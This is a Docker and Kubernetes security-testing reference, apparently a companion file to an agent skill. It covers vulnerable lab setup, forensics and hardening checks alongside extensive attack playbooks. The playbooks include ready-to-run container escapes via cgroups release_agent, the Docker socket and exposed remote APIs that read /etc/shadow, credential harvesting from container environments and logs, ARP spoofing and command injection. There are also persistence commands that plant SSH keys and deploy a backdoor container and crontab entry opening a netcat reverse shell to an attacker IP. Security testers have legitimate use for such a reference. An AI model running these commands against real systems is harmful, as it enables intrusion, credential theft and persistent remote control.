# Docker Patterns — Payloads & Commands

> Companion to `SKILL.md`. Contains Docker lab startup commands, additional lab configurations, evidence extraction patterns, and cleanup commands for security testing environments.

---

## Quick Start Checklist

```
1. Create lab network → 2. Start targets → 3. Start attacker → 4. Test → 5. Extract evidence → 6. Cleanup
```

---

## Quick Launch Commands

### One-Liner Lab Startup

```bash
# DVWA (SQLi, XSS, CSRF, LFI, Command Injection)
docker run --rm -d --name dvwa -p 127.0.0.1:8080:80 vulnerables/web-dvwa:latest

# SQLi Labs (Error-based, Blind, UNION, Time-based SQLi)
docker run --rm -d --name sqli-labs -p 127.0.0.1:8081:80 acgpiano/sqli-labs:latest

# OWASP Juice Shop (Full OWASP Top 10)
docker run --rm -d --name juice-shop -p 127.0.0.1:8082:3000 bkimminich/juice-shop:latest

# Vulnerable SSH
docker run --rm -d --name ssh-target -p 127.0.0.1:2222:22 rastasheep/ubuntu-sshd:18.04

# Vulnerable FTP
docker run --rm -d --name ftp-target -p 127.0.0.1:2121:21 stilliard/pure-ftpd:latest
```

### Batch Lab Startup

```bash
# Start all web labs at once
docker run --rm -d --name dvwa -p 127.0.0.1:8080:80 vulnerables/web-dvwa:latest && \
docker run --rm -d --name sqli-labs -p 127.0.0.1:8081:80 acgpiano/sqli-labs:latest && \
docker run --rm -d --name juice-shop -p 127.0.0.1:8082:3000 bkimminich/juice-shop:latest && \
echo "Labs running: DVWA(:8080) SQLi-Labs(:8081) JuiceShop(:8082)"
```

---

## Additional Lab Configurations

### WordPress Pentest Lab

```yaml
# docker-compose.wordpress.yml
version: '3.8'
services:
  wordpress:
    image: wordpress:6.0
    ports:
      - "127.0.0.1:8090:80"
    environment:
      - WORDPRESS_DB_HOST=db
      - WORDPRESS_DB_USER=wp_user
      - WORDPRESS_DB_PASSWORD=weakpass123
      - WORDPRESS_DB_NAME=wordpress
    networks:
      - wp-net
    depends_on:
      - db

  db:
    image: mysql:5.7
    environment:
      - MYSQL_DATABASE=wordpress
      - MYSQL_USER=wp_user
      - MYSQL_PASSWORD=weakpass123
      - MYSQL_ROOT_PASSWORD=rootpass123
    networks:
      - wp-net

  attacker:
    image: kalilinux/kali-rolling:latest
    networks:
      - wp-net
    command: tail -f /dev/null

networks:
  wp-net:
    driver: bridge
```

**Practice targets:** WP plugin exploitation, XML-RPC attacks, REST API enumeration, wp-admin brute force

### API Security Lab

```yaml
# docker-compose.api-lab.yml
version: '3.8'
services:
  vulnerable-api:
    image: mcybertop/vulnerable-rest-api:latest
    ports:
      - "127.0.0.1:8091:8080"
    networks:
      - api-net

  crapi:
    image: crapi/crapi-community:latest
    ports:
      - "127.0.0.1:8092:8888"
      - "127.0.0.1:8093:8025"
    networks:
      - api-net

networks:
  api-net:
    driver: bridge
```

**Practice targets:** IDOR, JWT attacks, GraphQL injection, API rate limiting bypass, mass assignment

### Active Directory Lab

```yaml
# docker-compose.ad-lab.yml
version: '3.8'
services:
  # Lightweight alternative: Samba-based AD
  samba-dc:
    image: instantlinux/samba-dc:latest
    hostname: dc1
    ports:
      - "127.0.0.1:53:53"
      - "127.0.0.1:88:88"
      - "127.0.0.1:389:389"
      - "127.0.0.1:445:445"
    environment:
      - DOMAIN=lab.local
      - ADMINPASS=P@ssw0rd
    networks:
      - ad-net

  attacker:
    image: kalilinux/kali-rolling:latest
    networks:
      - ad-net
    command: tail -f /dev/null
    cap_add:
      - NET_ADMIN

networks:
  ad-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.31.0.0/16
```

**Practice targets:** Kerberos attacks, LDAP enumeration, SMB relay, BloodHound collection

---

## Evidence Extraction Commands

### Container State Capture

```bash
# Capture running container info
docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}" | tee evidence/containers.txt

# Inspect container configuration
docker inspect <container_name> | jq '.' > evidence/<container_name>-inspect.json

# Capture container logs
docker logs <container_name> 2>&1 | tee evidence/<container_name>-logs.txt

# Capture container resource usage
docker stats --no-stream | tee evidence/container-stats.txt
```

### Network Traffic Capture

```bash
# Capture traffic on lab network bridge
sudo tcpdump -i br-<network_id> -w evidence/lab-traffic.pcap

# Capture HTTP traffic to file
sudo tcpdump -i br-<network_id> -A -s 0 'tcp port 80' | tee evidence/http-traffic.txt

# Extract container IPs
docker network inspect <network_name> | jq '.[].Containers[] | {Name: .Name, IP: .IPv4Address}'
```

### Volume/File Extraction

```bash
# Copy evidence from container
docker cp <container_name>:/var/log/auth.log evidence/auth.log
docker cp <container_name>:/var/log/apache2/access.log evidence/access.log

# Export container filesystem (for offline analysis)
docker export <container_name> | gzip > evidence/<container_name>-filesystem.tar.gz

# Diff container filesystem from base image
docker diff <container_name>
```

---

## Attacker Container Setup

### Kali Attacker with Tools

```bash
# Build attacker container with common tools
docker run --rm -it --name attacker \
  --network=host \
  -v $(pwd)/evidence:/evidence \
  kalilinux/kali-rolling:latest \
  bash -c "apt update && apt install -y \
    nmap \
    sqlmap \
    nikto \
    gobuster \
    dirb \
    ffuf \
    hydra \
    burpsuite \
    metasploit-framework \
    bloodhound \
    crackmapexec \
    impacket-scripts \
    responder \
    seclists \
    wordlists \
    && bash"
```

### Lightweight Attacker (Fast Setup)

```bash
# Minimal attacker with essential tools
docker run --rm -it --name attacker \
  --network=host \
  -v $(pwd)/evidence:/evidence \
  kalilinux/kali-rolling:latest \
  bash -c "apt update && apt install -y nmap curl jq python3-pip netcat-openbsd && bash"
```

---

## Cleanup Commands

### Single Lab Cleanup

```bash
# Stop and remove specific lab containers
docker stop dvwa sqli-labs juice-shop 2>/dev/null
docker rm dvwa sqli-labs juice-shop 2>/dev/null
echo "Lab containers removed"
```

### Full Lab Cleanup

```bash
# Stop all lab containers (named with common lab ports)
docker ps --filter "publish=8080" --filter "publish=8081" --filter "publish=8082" \
  --filter "publish=8090" --filter "publish=8091" --filter "publish=8092" \
  -q | xargs -r docker stop

# Remove all stopped containers
docker container prune -f

# Remove lab networks
docker network prune -f

# Remove dangling images
docker image prune -f

echo "Full cleanup complete"
```

### Docker Compose Cleanup

```bash
# Stop and remove compose stack with volumes
docker compose -f docker-compose.lab.yml down -v --rmi local

# Nuclear cleanup (everything non-running)
docker system prune -af --volumes
```

---

## Safety Verification Commands

```bash
# Verify no lab services bound to public interfaces
docker ps --format "{{.Ports}}" | grep -v "127.0.0.1" && echo "WARNING: Public bindings detected!" || echo "OK: All services on localhost"

# Check for exposed ports
ss -tlnp | grep -E ":(8080|8081|8082|8090|8091|8092|2222|2121) "

# Verify lab network isolation
docker network ls --filter "name=lab" --format "{{.Name}}"
```

---

## Container Security Scanning

### Image Vulnerability Assessment

```bash
# Trivy scan with severity filter
trivy image --severity HIGH,CRITICAL target_image:latest

# Trivy JSON output for automation
trivy image --format json -o scan_results.json target_image:latest

# Grype scan
grype target_image:latest --only-fixed -o json > grype_results.json

# Docker Scout
docker scout cves target_image:latest --only-severity critical,high
```

### Dockerfile Security Lint

```bash
# Hadolint static analysis
hadolint Dockerfile --format json > hadolint_results.json

# Check for common anti-patterns
grep -n "^USER" Dockerfile || echo "WARNING: No USER directive"
grep -n "FROM.*:latest" Dockerfile && echo "WARNING: Using :latest tag"
grep -n "^ADD " Dockerfile | grep -v "\.tar" && echo "WARNING: ADD used instead of COPY"
grep -n "ARG.*PASSWORD\|ARG.*SECRET\|ARG.*TOKEN" Dockerfile && echo "WARNING: Secrets in build args"
```

### Runtime Security Audit

```bash
# Check for privileged containers
docker ps -q | xargs docker inspect --format '{{.Name}}: privileged={{.HostConfig.Privileged}}' | grep "true"

# Check for dangerous capabilities
docker ps -q | xargs docker inspect --format '{{.Name}}: caps={{.HostConfig.CapAdd}}' | grep -v "\[\]"

# Check for host mounts
docker ps -q | xargs docker inspect --format '{{.Name}}: {{range .Mounts}}{{.Source}}→{{.Destination}} {{end}}' | grep -E "docker.sock|/proc|/sys|/dev"

# Check network mode
docker ps -q | xargs docker inspect --format '{{.Name}}: net={{.HostConfig.NetworkMode}}' | grep "host"
```

---

## Container Escape Testing

### Privileged Container Exploitation

```bash
# Detect privileged mode
cat /proc/self/status | grep CapEff
# 0000003fffffffff = fully privileged

# Mount host filesystem
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host
ls /mnt/host/etc/shadow

# Escape via cgroups release_agent
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w && echo 1 > $d/w/notify_on_release
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo $t/c > $d/release_agent && echo '#!/bin/sh' > /c
echo "cat /etc/shadow > $t/o" >> /c && chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs" && sleep 1 && cat /o
```

### Docker Socket Exploitation

```bash
# Check if docker socket is mounted
ls -la /var/run/docker.sock

# List host containers from within container
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | jq '.[].Names'

# Create escape container
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["cat","/host/etc/shadow"],"HostConfig":{"Binds":["/:/host"]}}'
```

### Capability Abuse

```bash
# Check current capabilities
capsh --print | grep "Current"

# CAP_SYS_ADMIN: mount host proc
mount -t proc proc /mnt

# CAP_SYS_PTRACE: inject into host process
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# CAP_NET_ADMIN: sniff traffic
tcpdump -i eth0 -w /tmp/capture.pcap
```

---

## Network Security Patterns

### Container Network Isolation Testing

```bash
# Test cross-network connectivity
docker exec container_a ping -c 1 container_b 2>&1
docker exec container_a nc -zv container_b 80 2>&1

# Enumerate containers on same network
docker exec attacker nmap -sn 172.18.0.0/16

# ARP scan within container network
docker exec attacker arp-scan --interface=eth0 --localnet
```

### Network Policy Enforcement

```bash
# Create isolated internal network
docker network create --internal --subnet 10.10.0.0/24 isolated_net

# Verify no external access
docker run --rm --network isolated_net alpine ping -c 1 8.8.8.8 2>&1 | grep -q "Network unreachable" && echo "ISOLATED"

# Inspect iptables rules for Docker
sudo iptables -L DOCKER-ISOLATION-STAGE-1 -n -v
sudo iptables -L DOCKER-ISOLATION-STAGE-2 -n -v
```

---

## Kubernetes Security Patterns

### Pod Security Assessment

```bash
# Find privileged pods
kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata | {namespace, name}'

# Find pods with hostNetwork
kubectl get pods -A -o json | jq '.items[] | select(.spec.hostNetwork==true) | .metadata | {namespace, name}'

# Find pods with mounted service account tokens
kubectl get pods -A -o json | jq '.items[] | select(.spec.automountServiceAccountToken!=false) | .metadata | {namespace, name}' | head -20

# Check RBAC permissions
kubectl auth can-i --list
kubectl auth can-i create pods --as=system:serviceaccount:default:default
```

### Secret Extraction

```bash
# List all secrets
kubectl get secrets -A -o json | jq '.items[] | {namespace: .metadata.namespace, name: .metadata.name, keys: (.data | keys)}'

# Decode specific secret
kubectl get secret db-credentials -o jsonpath='{.data.password}' | base64 -d

# Find secrets mounted in pods
kubectl get pods -A -o json | jq '.items[] | {name: .metadata.name, secrets: [.spec.volumes[]? | select(.secret) | .secret.secretName]}'
```

### Container Image Policy

```bash
# Check for images from untrusted registries
kubectl get pods -A -o json | jq '.items[].spec.containers[].image' | grep -v "gcr.io\|docker.io\|registry.k8s.io" | sort -u

# Find containers running as root
kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.runAsUser==0 or .spec.containers[].securityContext.runAsUser==null) | .metadata | {namespace, name}'

# Verify image pull policy
kubectl get pods -A -o json | jq '.items[].spec.containers[] | select(.imagePullPolicy!="Always") | {image, policy: .imagePullPolicy}'
```

---

## Docker Compose Security Patterns

### Hardened Compose Template

```yaml
# docker-compose.secure.yml
version: '3.8'
services:
  app:
    image: myapp:1.2.3  # Pinned version, never :latest
    read_only: true
    tmpfs:
      - /tmp
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    deploy:
      resources:
        limits:
          memory: 256M
          cpus: '0.5'
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8080/health"]
      interval: 30s
      timeout: 5s
      retries: 3
    networks:
      - internal
    ports:
      - "127.0.0.1:8080:8080"

networks:
  internal:
    internal: true
```

### Compose Security Audit Script

```bash
#!/bin/bash
# audit-compose.sh — Security audit for docker-compose files
FILE="${1:-docker-compose.yml}"
echo "=== Auditing: $FILE ==="
ISSUES=0

grep -qn "privileged: true" "$FILE" && echo "[CRITICAL] Privileged mode" && ((ISSUES++))
grep -qn "network_mode.*host" "$FILE" && echo "[HIGH] Host network" && ((ISSUES++))
grep -qn "/var/run/docker.sock" "$FILE" && echo "[CRITICAL] Docker socket" && ((ISSUES++))
grep -qn ":latest" "$FILE" && echo "[MEDIUM] Using :latest tag" && ((ISSUES++))
grep -qn "PASSWORD\|SECRET\|TOKEN" "$FILE" | grep -qv "_FILE" && echo "[HIGH] Inline secrets" && ((ISSUES++))
grep -qn "cap_add" "$FILE" && echo "[MEDIUM] Added capabilities" && ((ISSUES++))

echo "Total issues: $ISSUES"
[ "$ISSUES" -eq 0 ] && echo "PASSED" || echo "FAILED"
```

---

## Docker Compose Attack Scenarios

### Service Exploitation via Compose Networks

```bash
# Enumerate all services on a compose network
docker exec attacker nmap -sn 172.18.0.0/24 -oG - | grep "Up" | awk '{print $2}'

# Discover exposed service ports within compose network
docker exec attacker nmap -sT -p- --min-rate 5000 172.18.0.2 -oA /evidence/compose_scan

# Attack inter-service communication (e.g., Redis without auth)
docker exec attacker redis-cli -h 172.18.0.3 INFO server
docker exec attacker redis-cli -h 172.18.0.3 CONFIG GET requirepass

# Exploit service dependency chain — attack DB through app
docker exec attacker sqlmap -u "http://172.18.0.2:8080/api/users?id=1" \
  --batch --dbs --output-dir=/evidence/sqlmap_compose
```

### Network Pivoting Between Containers

```yaml
# docker-compose.pivot-lab.yml — Multi-network pivot scenario
version: '3.8'
services:
  web:
    image: vulnerables/web-dvwa:latest
    networks:
      - frontend
      - backend
    ports:
      - "127.0.0.1:8080:80"

  database:
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: toor
    networks:
      - backend
      - internal

  secret-service:
    image: nginx:alpine
    volumes:
      - ./flag.txt:/usr/share/nginx/html/flag.txt
    networks:
      - internal

  attacker:
    image: kalilinux/kali-rolling:latest
    networks:
      - frontend
    command: tail -f /dev/null

networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
    internal: true
  internal:
    driver: bridge
    internal: true
```

### Pivot Execution Commands

```bash
# From attacker container — discover web server on frontend network
docker exec attacker nmap -sn 172.19.0.0/24

# Exploit web app to get shell, then pivot to backend network
docker exec attacker curl -s http://172.19.0.2/vulnerabilities/exec/ \
  -d "ip=127.0.0.1;ip+route&Submit=Submit" --cookie "PHPSESSID=abc;security=low"

# From compromised web container — scan backend network
docker exec web bash -c "apt update && apt install -y nmap && nmap -sT 172.20.0.0/24"

# Tunnel through web container to reach internal network
docker exec attacker ssh -L 9999:172.21.0.2:80 root@172.19.0.2 -o StrictHostKeyChecking=no
```

### Compose Service Impersonation

```bash
# Create rogue service on same network to intercept traffic
docker run --rm -d --name rogue-db \
  --network $(docker network ls --filter name=backend -q) \
  -e MYSQL_ROOT_PASSWORD=toor \
  mysql:5.7

# ARP spoofing within compose network
docker exec attacker ettercap -T -q -i eth0 -M arp:remote /172.18.0.2// /172.18.0.3//

# DNS spoofing via compose DNS resolution
docker exec attacker bash -c "echo '172.18.0.5 database' >> /etc/hosts"

# Intercept service-to-service traffic with mitmproxy
docker run --rm -d --name mitm \
  --network $(docker network ls --filter name=backend -q) \
  mitmproxy/mitmproxy mitmdump -w /tmp/capture.flow
```

### Compose Volume Exploitation

```bash
# Find shared volumes between services
docker inspect --format '{{range .Mounts}}{{.Source}} -> {{.Destination}}{{"\n"}}{{end}}' $(docker ps -q)

# Exploit shared volume for lateral movement (write webshell via DB backup)
docker exec database mysqldump --all-databases > /shared/backup.sql
docker exec web bash -c "cp /shared/malicious.php /var/www/html/"

# Exploit named volumes for persistence
docker volume ls --format "{{.Name}}" | xargs -I{} docker volume inspect {}
docker run --rm -v target_data:/data alpine cat /data/config/secrets.yml
```

---

## Container Forensics

### Layer Inspection

```bash
# Inspect image history — find secrets in build layers
docker history --no-trunc target_image:latest

# Extract specific layer for analysis
docker save target_image:latest -o /tmp/image.tar
mkdir -p /tmp/image_layers && tar -xf /tmp/image.tar -C /tmp/image_layers
find /tmp/image_layers -name "layer.tar" -exec tar -tf {} \; | grep -iE "password|secret|key|\.env"

# Dive — interactive layer explorer
dive target_image:latest

# Compare layers between image versions
docker save app:v1.0 -o /tmp/v1.tar && docker save app:v2.0 -o /tmp/v2.tar
diff <(tar -tf /tmp/v1.tar | sort) <(tar -tf /tmp/v2.tar | sort)

# Extract environment variables from image config
docker inspect target_image:latest | jq '.[0].Config.Env'
docker inspect target_image:latest | jq '.[0].Config.Cmd'
```

### Runtime Analysis

```bash
# Capture running process tree inside container
docker exec target_container ps auxf | tee evidence/processes.txt

# Monitor real-time system calls with strace
docker exec --privileged target_container strace -f -p 1 -o /tmp/strace.log &
sleep 30 && docker cp target_container:/tmp/strace.log evidence/

# Monitor file system events
docker exec target_container inotifywait -m -r /etc /var/www /tmp 2>&1 \
  | tee evidence/fs_events.txt &

# Capture network connections and listening ports
docker exec target_container ss -tlnp | tee evidence/listening_ports.txt
docker exec target_container ss -tnp | tee evidence/active_connections.txt

# Monitor container resource usage over time
docker stats target_container --format "{{.CPUPerc}}\t{{.MemUsage}}\t{{.NetIO}}" \
  --no-stream | tee -a evidence/resource_timeline.txt
```

### Evidence Preservation

```bash
# Create forensic snapshot of running container
docker commit target_container forensic_snapshot:$(date +%Y%m%d_%H%M%S)
docker save forensic_snapshot:$(date +%Y%m%d_%H%M%S) | gzip > evidence/snapshot.tar.gz

# Preserve container metadata
docker inspect target_container > evidence/container_metadata.json
docker logs --timestamps target_container > evidence/container_logs.txt 2>&1

# Hash all evidence files for chain of custody
find evidence/ -type f -exec sha256sum {} \; > evidence/checksums.sha256
echo "Evidence collected at $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> evidence/chain_of_custody.txt

# Export container filesystem diff (changes from base image)
docker diff target_container > evidence/filesystem_changes.txt
docker export target_container | tar -t | sort > evidence/full_filesystem_listing.txt
```

### Memory and Process Forensics

```bash
# Dump container memory (requires privileged access to host)
CONTAINER_PID=$(docker inspect --format '{{.State.Pid}}' target_container)
sudo gcore -o evidence/memdump $CONTAINER_PID

# Extract strings from memory dump
strings evidence/memdump.$CONTAINER_PID | grep -iE "password|token|secret|key=" \
  > evidence/memory_strings.txt

# Capture /proc information from container's PID namespace
sudo ls -la /proc/$CONTAINER_PID/fd/ > evidence/open_files.txt
sudo cat /proc/$CONTAINER_PID/maps > evidence/memory_maps.txt
sudo cat /proc/$CONTAINER_PID/environ | tr '\0' '\n' > evidence/environment.txt

# Timeline reconstruction from container logs and host audit
docker logs --since="2h" --timestamps target_container 2>&1 | sort > evidence/timeline.txt
sudo ausearch --pid $CONTAINER_PID --start recent > evidence/audit_trail.txt 2>/dev/null
```

---

## Docker API Exploitation

### Remote API Discovery and Abuse

```bash
# Scan for exposed Docker API (default port 2375/2376)
nmap -sT -p 2375,2376 <target_range> -oG - | grep "open"

# Enumerate containers via unauthenticated API
curl -s http://<target>:2375/containers/json | jq '.[].Names'
curl -s http://<target>:2375/images/json | jq '.[].RepoTags'
curl -s http://<target>:2375/info | jq '{Containers, Images, OperatingSystem, KernelVersion}'

# Get host info through Docker API
curl -s http://<target>:2375/version | jq .
curl -s http://<target>:2375/system/df | jq .

# List all volumes (may contain secrets)
curl -s http://<target>:2375/volumes | jq '.Volumes[].Name'
```

### Container Creation for Host Escape

```bash
# Create privileged container mounting host root filesystem
curl -s -X POST http://<target>:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "cat /host/etc/shadow"],
    "HostConfig": {
      "Binds": ["/:/host"],
      "Privileged": true
    }
  }' | jq .

# Start the escape container
CONTAINER_ID=$(curl -s -X POST http://<target>:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' | jq -r .Id)
curl -s -X POST "http://<target>:2375/containers/$CONTAINER_ID/start"

# Execute commands in escape container
curl -s -X POST "http://<target>:2375/containers/$CONTAINER_ID/exec" \
  -H "Content-Type: application/json" \
  -d '{"Cmd":["cat","/host/etc/shadow"],"AttachStdout":true}' | jq .
```

### Docker API Credential Harvesting

```bash
# Extract environment variables from all containers (may contain secrets)
for id in $(curl -s http://<target>:2375/containers/json | jq -r '.[].Id'); do
  echo "=== Container: $id ==="
  curl -s "http://<target>:2375/containers/$id/json" | jq '.Config.Env[]' 2>/dev/null
done

# Read container logs for credential leakage
for id in $(curl -s http://<target>:2375/containers/json | jq -r '.[].Id'); do
  curl -s "http://<target>:2375/containers/$id/logs?stdout=true&tail=100" \
    | strings | grep -iE "password|token|secret|key="
done

# Inspect mounted volumes for secrets
curl -s http://<target>:2375/containers/json | jq '.[].Mounts[] | select(.Source | contains("secret") or contains("key") or contains("cert"))'
```

### Docker API Persistence

```bash
# Deploy backdoor container with auto-restart
curl -s -X POST http://<target>:2375/containers/create?name=system-monitor \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "while true; do nc <attacker_ip> 4444 -e /bin/sh; sleep 60; done"],
    "HostConfig": {
      "RestartPolicy": {"Name": "always"},
      "NetworkMode": "host"
    }
  }'

# Create cron-based persistence via host mount
curl -s -X POST http://<target>:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "echo \"* * * * * root nc <attacker_ip> 4444 -e /bin/sh\" >> /host/etc/crontab"],
    "HostConfig": {"Binds": ["/:/host"]}
  }'

# Add SSH key to host via container
curl -s -X POST http://<target>:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "mkdir -p /host/root/.ssh && echo \"ssh-rsa AAAA...\" >> /host/root/.ssh/authorized_keys"],
    "HostConfig": {"Binds": ["/:/host"]}
  }'
```

### Docker TLS Certificate Exploitation

```bash
# Check for weak TLS configuration
openssl s_client -connect <target>:2376 -showcerts 2>/dev/null | openssl x509 -noout -text

# Attempt connection with stolen client certificates
curl --cert client-cert.pem --key client-key.pem --cacert ca.pem \
  https://<target>:2376/containers/json | jq .

# Enumerate certificate locations on compromised host
find / -name "*.pem" -path "*docker*" 2>/dev/null
find / -name "ca.pem" -o -name "cert.pem" -o -name "key.pem" 2>/dev/null | grep docker
ls -la /etc/docker/certs.d/ ~/.docker/ 2>/dev/null
```

---

## Supply Chain Security

### Image Signing and Verification

```bash
# Enable Docker Content Trust
export DOCKER_CONTENT_TRUST=1

# Sign and push image
docker trust sign myregistry.io/app:v1.2.3

# Verify image signature before pulling
docker trust inspect --pretty myregistry.io/app:v1.2.3

# Check Notary delegation keys
notary -s https://notary.myregistry.io list myregistry.io/app

# Cosign — sign with keyless (OIDC)
cosign sign --yes myregistry.io/app@sha256:<digest>

# Cosign — verify signature
cosign verify myregistry.io/app:v1.2.3 --certificate-identity=ci@example.com \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com
```

### Base Image Verification

```bash
# Verify base image digest matches expected
EXPECTED_DIGEST="sha256:abc123..."
ACTUAL_DIGEST=$(docker inspect --format='{{.RepoDigests}}' alpine:3.19 | grep -oP 'sha256:[a-f0-9]+')
[ "$EXPECTED_DIGEST" = "$ACTUAL_DIGEST" ] && echo "VERIFIED" || echo "MISMATCH — possible supply chain attack"

# Pin base images by digest in Dockerfile
# FROM alpine@sha256:abc123def456...
grep "^FROM" Dockerfile | grep -v "@sha256:" && echo "WARNING: Base images not pinned by digest"

# Check base image for known vulnerabilities
trivy image alpine:3.19 --severity CRITICAL,HIGH --format table

# Verify image provenance with SLSA
cosign verify-attestation --type slsaprovenance \
  --certificate-identity=ci@example.com \
  myregistry.io/app:v1.2.3
```

### Dockerfile Security Linting

```bash
# Hadolint — comprehensive Dockerfile linting
hadolint --format json Dockerfile | jq '.[] | {line, code, message, level}'

# Check for multi-stage build secret leakage
grep -n "COPY --from=builder" Dockerfile
grep -n "ARG\|ENV" Dockerfile | grep -iE "password|secret|token|key"

# Verify no secrets in build context
cat .dockerignore 2>/dev/null || echo "WARNING: No .dockerignore file"
echo "Checking for secrets in build context..."
find . -name ".env*" -o -name "*.pem" -o -name "*.key" -o -name "id_rsa" \
  | grep -v ".dockerignore" | head -10

# Dockle — container image linter (CIS Benchmark)
dockle --format json myregistry.io/app:v1.2.3 | jq '.details[] | select(.level == "FATAL" or .level == "WARN")'

# Custom security checks
grep -n "^USER" Dockerfile || echo "FAIL: No USER directive — runs as root"
grep -n "HEALTHCHECK" Dockerfile || echo "WARN: No HEALTHCHECK defined"
grep -n "^EXPOSE" Dockerfile | awk -F' ' '{if($2<1024) print "WARN: Privileged port "$2}'
```

### SBOM Generation and Analysis

```bash
# Generate SBOM with Syft
syft myregistry.io/app:v1.2.3 -o spdx-json > sbom.spdx.json
syft myregistry.io/app:v1.2.3 -o cyclonedx-json > sbom.cdx.json

# Scan SBOM for vulnerabilities
grype sbom:sbom.cdx.json --only-fixed -o json > vuln_report.json

# Attach SBOM to image as attestation
cosign attest --predicate sbom.spdx.json --type spdxjson myregistry.io/app:v1.2.3

# Compare SBOMs between versions for unexpected changes
diff <(jq '.packages[].name' sbom_v1.spdx.json | sort) \
     <(jq '.packages[].name' sbom_v2.spdx.json | sort)

# Check for typosquatting in dependencies
jq '.packages[].name' sbom.spdx.json | sort | uniq -c | sort -rn | head -20
```

### Registry Security Assessment

```bash
# Check registry for anonymous access
curl -s https://registry.target.com/v2/_catalog | jq .
curl -s https://registry.target.com/v2/app/tags/list | jq .

# Enumerate registry contents
curl -s https://registry.target.com/v2/_catalog | jq -r '.repositories[]' | while read repo; do
  echo "=== $repo ==="
  curl -s "https://registry.target.com/v2/$repo/tags/list" | jq -r '.tags[]' 2>/dev/null | head -5
done

# Pull and inspect manifests for secrets
curl -s -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
  https://registry.target.com/v2/app/manifests/latest | jq .

# Check for image deletion capability (misconfigured registry)
curl -s -X DELETE "https://registry.target.com/v2/app/manifests/sha256:<digest>" -w "%{http_code}"

# Scan for exposed registries on network
nmap -sT -p 5000,5001,8443 <target_range> --script http-title -oG - | grep "Docker Registry"
```
